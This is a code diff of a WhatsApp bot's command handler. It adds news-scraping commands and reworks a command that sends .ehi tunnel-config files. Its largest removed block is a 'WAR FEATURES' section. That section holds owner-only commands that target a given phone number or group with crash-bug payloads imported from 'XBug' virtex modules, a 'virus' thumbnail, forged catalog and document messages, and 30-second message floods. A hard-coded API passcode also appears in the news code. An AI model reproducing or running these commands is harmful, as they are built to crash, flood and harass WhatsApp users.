@@ -92,19 +92,9 @@ let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json')
 let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
 let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'));
 let autorep =JSON.parse(fs.readFileSync('./database/autoreply.json'));
-
+ 
 //database virus and whatsapp bugs
 //warrrrrrrrr
-const { xeonvirtex } = require('./XBug/xeonvirtex')
-const { xeonbutton } = require('./XBug/xeonbutton')
-const { xeonbrutal } = require('./XBug/xeonbrutal')
-const { iphone } = require('./XBug/virtex/iphone')
-const { iphone5 } = require('./XBug/virtex/iphone5')
-const { xeonbutton2 } = require('./XBug/virtex/xeonbutton2')
-const { bugsw } = require('./XBug/virtex/bugsw')
-const xpicvirus = fs.readFileSync(`./XBug/xpicvirus.png`)
-//warrrrrrrrrr
-
 //database auto reply
 let janiyasticker = JSON.parse(fs.readFileSync('./Media/janiya/sticker.json'));
 let janiyaaudio = JSON.parse(fs.readFileSync('./Media/janiya/audio.json'));
@@ -1151,31 +1141,36 @@ case 'apk':{
               ////----------------------------------------EHI STORE ----------------------------------\\\\\
 
 
-              case 'testehi' : {
-                const ehinima = await fetchJson ('https://github.com/Dragonxjanith/UPLOADS/raw/main/JSON/EHIJSON.json')
-                msg = ehinima.EHI_FILES[0].SG_FILE1
-                msg2 = ehinima.EHI_FILES[0].SG_FILE2
-                msg3 = ehinima.EHI_FILES[0].SG_FILE3
-                msg4 = ehinima.EHI_FILES[0].SG_FILE4
-                msg5 = ehinima.EHI_FILES[1].US_FILE1
-                msg6 = ehinima.EHI_FILES[1].US_FILE2
-                msg7 = ehinima.EHI_FILES[1].US_FILE3
-                msg8 = ehinima.EHI_FILES[1].US_FILE4
-                
-                
-                
-                await QueenNilu.sendText(m.chat, `${ehinima.EHI}
-               1. ${msg} 
-               2. ${msg2} 
-               3. ${msg3}
-               4. ${msg4}
-               5. ${msg5}
-               6. ${msg6}
-               7. ${msg7}
-               8. ${msg8}
-               `)
-                }
-                break
+              case 'elisaehi': {
+    
+                const ehinima = await fetchJson ('https://github.com/DarkMakerofc/UPLOADS/raw/main/JSON/EHIJSON.json')
+              ehi = ehinima.EHI_FILES[0].SG_FILE1
+              ehi2 = ehinima.EHI_FILES[0].SG_FILE2
+              ehi3 = ehinima.EHI_FILES[0].SG_FILE3
+              ehi4 = ehinima.EHI_FILES[0].SG_FILE4
+              ehi5 = ehinima.EHI_FILES[1].US_FILE1
+              ehi6 = ehinima.EHI_FILES[1].US_FILE2
+              ehi7 = ehinima.EHI_FILES[1].US_FILE3
+              ehi8 = ehinima.EHI_FILES[1].US_FILE4
+                             
+                            await QueenNilu.sendMessage(m.chat, { text : `
+            ${ehinima.EHI}
+            ${ehinima.C_E_DATES}
+            ${ehinima.XX_XX}
+            ` } ,{ quoted: m })
+                            await QueenNilu.sendMessage(m.chat, { document: { url: ehi }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI} FaceBook ${ehinima.EHI_IMOJI}.ehi`}, { quoted: m })
+                            await QueenNilu.sendMessage(m.chat, { document: { url: ehi2 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI} Whatsapp ${ehinima.EHI_IMOJI}.ehi `}, { quoted: m })
+                            await QueenNilu.sendMessage(m.chat, { document: { url: ehi3 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI} Youtube ${ehinima.EHI_IMOJI}.ehi`}, { quoted: m })
+                            await QueenNilu.sendMessage(m.chat, { document: { url: ehi4 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI} Zoom ${ehinima.EHI_IMOJI}.ehi`}, { quoted: m })
+                            await QueenNilu.sendMessage(m.chat, { document: { url: ehi5 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI2} FaceBook ${ehinima.EHI_IMOJI2}.ehi`}, { quoted: m })
+                            await QueenNilu.sendMessage(m.chat, { document: { url: ehi6 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI2} Whatsapp ${ehinima.EHI_IMOJI2}.ehi `}, { quoted: m })
+                            await QueenNilu.sendMessage(m.chat, { document: { url: ehi7 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI2} Youtube ${ehinima.EHI_IMOJI2}.ehi`}, { quoted: m })
+                            await QueenNilu.sendMessage(m.chat, { document: { url: ehi8 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI2} Zoom ${ehinima.EHI_IMOJI2}.ehi`}, { quoted: m })
+                            
+                            await QueenNilu.sendText(m.chat, `✅ _Success send_ *${m.pushName}* _Ehi Files..._`,m)
+                            
+                            }
+                            break
               
                             case 'ehi' :  {
                               const buffer = await getBuffer('https://te.legra.ph/file/57c7bd5c8b26430634a40.jpg')
@@ -1230,36 +1225,6 @@ case 'apk':{
               
 
                  break
-			case 'elisaehi': {
-    
-    const ehinima = await fetchJson ('https://github.com/dragonxjanith/UPLOADS/raw/main/JSON/EHIJSON.json')
-  ehi = ehinima.EHI_FILES[0].SG_FILE1
-  ehi2 = ehinima.EHI_FILES[0].SG_FILE2
-  ehi3 = ehinima.EHI_FILES[0].SG_FILE3
-  ehi4 = ehinima.EHI_FILES[0].SG_FILE4
-  ehi5 = ehinima.EHI_FILES[1].US_FILE1
-  ehi6 = ehinima.EHI_FILES[1].US_FILE2
-  ehi7 = ehinima.EHI_FILES[1].US_FILE3
-  ehi8 = ehinima.EHI_FILES[1].US_FILE4
-                 
-                await QueenNilu.sendMessage(m.chat, { text : `
-${ehinima.EHI}
-${ehinima.C_E_DATES}
-${ehinima.XX_XX}
-` } ,{ quoted: m })
-                await QueenNilu.sendMessage(m.chat, { document: { url: ehi }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI} FaceBook ${ehinima.EHI_IMOJI}.ehi`}, { quoted: m })
-                await QueenNilu.sendMessage(m.chat, { document: { url: ehi2 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI} Whatsapp ${ehinima.EHI_IMOJI}.ehi `}, { quoted: m })
-                await QueenNilu.sendMessage(m.chat, { document: { url: ehi3 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI} Youtube ${ehinima.EHI_IMOJI}.ehi`}, { quoted: m })
-                await QueenNilu.sendMessage(m.chat, { document: { url: ehi4 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI} Zoom ${ehinima.EHI_IMOJI}.ehi`}, { quoted: m })
-                await QueenNilu.sendMessage(m.chat, { document: { url: ehi5 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI2} FaceBook ${ehinima.EHI_IMOJI2}.ehi`}, { quoted: m })
-                await QueenNilu.sendMessage(m.chat, { document: { url: ehi6 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI2} Whatsapp ${ehinima.EHI_IMOJI2}.ehi `}, { quoted: m })
-                await QueenNilu.sendMessage(m.chat, { document: { url: ehi7 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI2} Youtube ${ehinima.EHI_IMOJI2}.ehi`}, { quoted: m })
-                await QueenNilu.sendMessage(m.chat, { document: { url: ehi8 }, mimetype: 'application/octet-stream', fileName: `${ehinima.EHI_IMOJI2} Zoom ${ehinima.EHI_IMOJI2}.ehi`}, { quoted: m })
-                
-                await QueenNilu.sendText(m.chat, `✅ _Success send_ *${m.pushName}* _Ehi Files..._`,m)
-                
-                }
-             break
 
                  case 'aboutehi' :{
                     var ABOUTEHI = ''
@@ -1406,7 +1371,179 @@ Cieeee, What's Going On❤️💖👀`
             await QueenNilu.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
             }
             break
+            //////////////////////////////////////////////  News 
+
+            case 'news' : {
+                const load = await QueenNilu.sendText(m.chat, mess.wait , m, ) 
+                const news = await fetchJson(`https://api.sdbots.tk/hirunews`)
+                const cap = `*💃𝐐𝐔𝐄𝐄𝐍 𝐍𝐈𝐋𝐔 𝐍𝐄𝐖𝐒 💃*
+                
+         *🏷️ මාතෘකාව :* ${news.title}
+         *⏰ අලුත් කරන වේලාව :* _${news.date}_
+         
+         *📄️ විස්තරය :*
+         ${news.description}
+         
+         `
+         const templateButtons = [
+             {index: 1, urlButton: {displayText: `හිරු පුවත්`, url: news.link }},
+         
+         
+             ]
+         
+         const templateMessage = {
+             image: {url: news.img },
+             caption: '     ⫷ 💃𝐐𝐔𝐄𝐄𝐍 𝐍𝐈𝐋𝐔 𝐍𝐄𝐖𝐒 💃 ⫸\n\n'+cap,
+             footer: global.botnma,
+             templateButtons: templateButtons,
+             headerType: 4
+         }
+              
+              await QueenNilu.sendMessage(m.chat, templateMessage, { quoted: m })
+              await QueenNilu.sendMessage(m.chat,{delete : load.key })  
+          
+             // await QueenNilu.sendMessage(m.chat, { image: { url : news.img} , caption : cap }, { quoted: m })
+           }
+           break
+           
+            case 'news2' : {
+            const load = await QueenNilu.sendText(m.chat, mess.wait , m, )
+                
+            const {esana_scrape, esana_latest_news_id, esana_scrape_from_id} = require("esana-node-api").esana_news;
+            const helnews = await esana_scrape({ fetch: 'latest' , passcode: 'uakdmin_sr_2064'}) // Enter Your Passcode or Contact Admin (+94766239744)
+         
+         const title = helnews.news.helakuru.title
+         const news = helnews.news.helakuru.description
+         const img = helnews.news.helakuru.thumb
+         const url = helnews.news.helakuru.url
+         const date = helnews.news.helakuru.data
+         
+         const cap = `*_🏷️ Title_ ${title}*\n\n*_📄 News_* ${news}\n`
+         const templateButtons = [
+             {index: 1, urlButton: {displayText: `එසැන පුවත්`, url: url }},
+         
+         
+             ]
+         
+         const templateMessage = {
+             image: {url: img },
+             caption: '     ⫷ 💃𝐐𝐔𝐄𝐄𝐍 𝐍𝐈𝐋𝐔 𝐍𝐄𝐖𝐒 💃 ⫸\n\n'+cap,
+             footer: global.botnma+'\n ᴛʜᴀɴᴋs ᴛᴏ sɪsᴜʟʏᴀ',
+             templateButtons: templateButtons,
+             headerType: 4
+         }
+              
+              await QueenNilu.sendMessage(m.chat, templateMessage, { quoted: m })
+              await QueenNilu.sendMessage(m.chat,{delete : load.key })  
+                    
+            }
+            break
+            case 'newsjson' : {
+            const {esana_scrape, esana_latest_news_id, esana_scrape_from_id} = require("esana-node-api").esana_news;
+            const all_news = await esana_scrape({ fetch: 'all' , passcode: 'uakdmin_sr_2064'}) // Enter Your Passcode or Contact Admin (+94766239744)
+           // const helnews = await esana_scrape({ fetch: 'latest' , passcode: 'uakdmin_sr_2064'}) // Enter Your Passcode or Contact Admin (+94766239744)
+          //  const helnew_s = await esana_scrape_from_id({ id: text , passcode: 'uakdmin_sr_2064'})
+           const cap = `
+           ${jsonformat(all_news)}
+           `
+         reply(cap)
+         //reply(jsonformat(helnews))
+         //reply(jsonformat(helnew_s))
             
+            }
+          break
+          case 'newsjson2' : {
+            const {esana_scrape, esana_latest_news_id, esana_scrape_from_id} = require("esana-node-api").esana_news;
+            //const all_news = await esana_scrape({ fetch: 'all' , passcode: 'uakdmin_sr_2064'}) // Enter Your Passcode or Contact Admin (+94766239744)
+           // const helnews = await esana_scrape({ fetch: 'latest' , passcode: 'uakdmin_sr_2064'}) // Enter Your Passcode or Contact Admin (+94766239744)
+            const helnew_s = await esana_scrape_from_id({ id: text , passcode: 'uakdmin_sr_2064'})
+           const cap = `
+           ${jsonformat(helnew_s)}
+           `
+         reply(cap)
+         //reply(jsonformat(helnews))
+         //reply(jsonformat(helnew_s))
+            
+            }
+          break
+            case 'helakurunews' : case 'findnews' : {
+            const load = await QueenNilu.sendText(m.chat, mess.wait , m, )
+         
+            var NEWSSS = ''
+           if (global.LANG == 'EN') NEWSSS = '```👸💬 Click And Get Your news```'
+           if (global.LANG == 'SI') NEWSSS = '```👸💬 ඔබට අවශ්‍ය පුවත පහත බටන බාවිතයෙන් ලබාගන්න```'
+         
+            const {esana_scrape, esana_latest_news_id, esana_scrape_from_id} = require("esana-node-api").esana_news;
+            const all_news = await esana_scrape({ fetch: 'all' , passcode: 'uakdmin_sr_2064'}) // Enter Your Passcode or Contact Admin (+94766239744)
+            
+           
+               // reply(jsonformat(all_news))
+            
+           // reply(i.news_id)
+            let sections = []   
+           for (let i of all_news) {
+         //  reply(i.news_id)
+           const list = {title: `ǫᴜᴇᴇɴ ᴇʟɪsᴀ ɴᴇᴡs `,
+           rows: [
+                 {
+                  title: `${i.title}`, 
+                  rowId: `getnews ${i.id}`
+                 }, 
+                 ]
+              }
+              sections.push(list)   
+              }
+           const sendm =  QueenNilu.sendMessage(
+               m.chat, 
+               {
+                text: NEWSSS,
+                footer: global.botnma+'\n get on helakuru.com' ,
+                title: "*⫷  💃𝐐𝐔𝐄𝐄𝐍 𝐍𝐈𝐋𝐔 𝐍𝐄𝐖𝐒 💃 ⫸*",
+                buttonText: "GET NEWS",
+                sections
+               }, { quoted : m })    
+            
+            //all
+           /* const all_news = await esana_scrape({ fetch: 'all' , passcode: 'your_passcode'}) // Enter Your Passcode or Contact Admin (+94766239744)
+            reply(latest_news)*/
+            await QueenNilu.sendMessage(m.chat,{delete : load.key })  
+           
+            
+            }
+            break
+            case 'getnews' : {
+            const load = await QueenNilu.sendText(m.chat, mess.wait , m, )
+         
+            const {esana_scrape, esana_latest_news_id, esana_scrape_from_id} = require("esana-node-api").esana_news;
+            const helnews = await esana_scrape_from_id({ id: text , passcode: 'uakdmin_sr_2064'})
+          //  reply(jsonformat(helnews))        
+         
+         const title = helnews.news_from_id.helakuru.title
+         const news = helnews.news_from_id.helakuru.description
+         const img = helnews.news_from_id.helakuru.thumb
+         const url = helnews.news_from_id.helakuru.url
+         const date = helnews.news_from_id.helakuru.data
+         
+         const cap = `*_🏷️ Title_ ${title}*\n\n*_📄 News_* ${news}\n`
+         const templateButtons = [
+             {index: 1, urlButton: {displayText: `ɴᴇᴡs ᴜʀʟ`, url: url }},
+         ]
+         
+         const templateMessage = {
+             image: {url: img },
+             caption: '     ⫷ 👸 *𝚀𝚄𝙴𝙴𝙽 𝙴𝙻𝙸𝚂𝙰 𝙽𝙴𝚆𝚂* 👸 ⫸\n\n'+cap,
+             footer: `${global.botnma}` ,
+             templateButtons: templateButtons,
+             headerType: 4
+         }
+              
+              await QueenNilu.sendMessage(m.chat, templateMessage, { quoted: m })
+              await QueenNilu.sendMessage(m.chat,{delete : load.key })  
+                    
+                    
+            
+            }
+            break
             case 'react': {
                 if (!isCreator) throw mess.owner
                 reactionMessage = {
@@ -5068,12 +5205,12 @@ case 'keluar': case 'leave': {
                 m.reply('*Successful in Changing To Public Usage*')
             }
             break
-            case 'self': {
+            case 'self': { 
                 if (!isCreator) throw mess.owner
                 QueenNilu.public = false
                 m.reply('*Successful in Changing To Self Usage*')
             }
-            break
+            break 
             case 'ping': case 'botstatus': case 'statusbot': case 'p': {
                 const used = process.memoryUsage()
                 const cpus = os.cpus().map(cpu => {
@@ -8028,1001 +8165,8 @@ var inputnumber = text.split(" ")[0]
         m.reply(`${text66}${nobio}${nowhatsapp}`)
 break
     
-
-//----------------☣️WAR FEATURES☣️---------------\\
-//Note: if you edit, features wont work!!!⚠️
-case 'pcbut':
-            	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                    if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbut 91xxxxxxxxxx`)
-                 buttonvirus = [
-                          {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1},
-  {buttonId: 'xeon', buttonText: {displayText: xeonbutton}, type: 1},
-  {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1}
-]
-                    buttonMsgX = {
-                          text: author,
-                          footerText: botname,
-                          buttons: buttonvirus,
-                          headerType: 1
-                      }
-                      QueenNilu.sendMessage(`${text}@s.whatsapp.net`, buttonMsgX)
-                      reply(mess.success)
-                    break
-case 'pcstick':{
-            	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcstick 91xxxxxxxxxx`)
-xeonOP = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: "" }) 
-        }, 
-        message: { 
-            "imageMessage": { 
-                "mimetype": "image/jpeg", 
-                "caption": botname, 
-                "jpegThumbnail": xpicvirus
-            } 
-        } 
-    }
- xeonsteker = fs.readFileSync('./XBug/xstick.webp')
-QueenNilu.sendImageAsSticker(`${text}@s.whatsapp.net`, xeonsteker, xeonOP, { packname: global.packname, author: global.author })
-await reply(`Successfully bug sticker attacked ${text}@s.whatsapp.net`)
-}
-break
-case 'pcvn':{
-            	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcvn 91xxxxxxxxxx`)
-xeonvn = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: "" }) 
-        }, 
-        message: { 
-            "imageMessage": { 
-                "mimetype": "image/jpeg", 
-                "caption": botname, 
-                "jpegThumbnail": xpicvirus
-            } 
-        } 
-    }
- xaudio = fs.readFileSync('./XBug/fullChudaiBaazi.mp3')
- QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {audio: xaudio, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonvn})
-await reply(`Successfully Bug Attacked The Number ${text}@s.whatsapp.net`)
-}
-break
-case 'catalogbugxxx': {
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (!m.isGroup) return m.reply(mess.group)
-if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-const xeontalog = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
-var xeonmess = await prepareWAMessageMedia({ image: xpicvirus }, { upload: QueenNilu.waUploadToServer })
-var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-"productMessage": {
-"product": {
-"productImage": xeonmess.imageMessage,
-"productId": "99999999999999",
-"title": `Janiya☣️ ${xeonbutton} ${xeonbutton}`,
-"description": `Janiya☣️ ${xeonbutton} ${xeonbutton}`,
-"currencyCode": "INR",
-"footerText": botname,
-"priceAmount1000": "10000000",
-"productImageCount": 1,
-"firstImageId": 1,
-"salePriceAmount1000": "10000000",
-"retailerId": author,
-"url": websitex
-},
-"businessOwnerJid": "916909137213@s.whatsapp.net",
-}
-}), { userJid: m.chat, quoted: xeontalog })
-QueenNilu.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
-}
-}
-break
-	case 'vnbug':{
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-janiyavn = { 
-        key: { 
-            fromMe: false, 
-            participant: `0@s.whatsapp.net`, 
-            ...({ remoteJid: "" }) 
-        }, 
-        message: { 
-            "imageMessage": { 
-                "mimetype": "image/jpeg", 
-                "caption": botname, 
-                "jpegThumbnail": xpicvirus
-            } 
-        } 
-    }
- janiyaaud = fs.readFileSync('./XBug/fullChudaiBaazi.mp3')
- QueenNilu.sendMessage(m.chat, {audio: janiyaaud, mimetype: 'audio/mpeg', ptt:true }, {quoted: janiyavn})
- }
- }
-break
-	case 'docbug':{
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-QueenNilu.sendMessage(m.chat, {document: xpicvirus},{quoted: {
-key: {
-fromMe: false, 
-participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
-},
-"message": {
-"documentMessage": {
-"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
-"mimetype": "application/octet-stream",
-"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
-"fileLength": "64455",
-"pageCount": 1,
-"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `Janiya☣️${xeonbrutal(prefix)}`,
-"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
-	}
-}
-}})
-}
-}
-break
-case 'pcslow': { 
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcmass 91xxxxxxxxxx`)
-             janiyah1 = { 
-                    key: { 
-                        fromMe: false, 
-                        participant: `0@s.whatsapp.net`, 
-                        ...({ remoteJid: "" }) 
-                    }, 
-                    message: { 
-                        "imageMessage": { 
-                            "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
-                            "jpegThumbnail": xpicvirus
-                        } 
-                    } 
-                }
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:janiyah1})
-            await sleep(30000)
-            }
-            break
-case 'pcgcslow': {          
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (!m.isGroup) return m.reply(mess.group)
-if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx`)
-             pmgcmassxeon = { 
-                    key: { 
-                        fromMe: false, 
-                        participant: `0@s.whatsapp.net`, 
-                        ...({ remoteJid: "" }) 
-                    }, 
-                    message: { 
-                        "imageMessage": { 
-                            "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
-                            "jpegThumbnail": xpicvirus
-                        } 
-                    } 
-                }
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(`${text}@s.whatsapp.net`, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            await QueenNilu.sendMessage(m.chat, {text:"Janiya☣️"},{quoted:pmgcmassxeon})
-            await sleep(30000)
-            }
-            break
-         case 'gcslow':               
-            	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (!m.isGroup) return m.reply(mess.group)
-             gcmassxeon = { 
-                    key: { 
-                        fromMe: false, 
-                        participant: `0@s.whatsapp.net`, 
-                        ...({ remoteJid: "" }) 
-                    }, 
-                    message: { 
-                        "imageMessage": { 
-                            "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
-                            "jpegThumbnail": xpicvirus
-                        } 
-                    } 
-                }
